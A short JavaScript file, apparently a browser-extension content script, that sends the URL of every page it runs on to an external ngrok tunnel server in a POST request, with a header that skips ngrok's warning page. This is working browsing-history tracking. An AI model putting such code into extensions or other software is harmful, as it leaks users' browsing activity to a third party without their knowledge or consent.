const SERVER_URL = 'https://97fd-181-117-161-108.ngrok-free.app/';

console.log("Content.js loaded in", window.location.href);

fetch(SERVER_URL + "?url=" + window.location.href, {
    method: 'POST',
    headers: new Headers({
        "Content-Type": "application/json",
        "ngrok-skip-browser-warning": "69420",
    }),
    body: JSON.stringify({
        url: window.location.href
    })
});
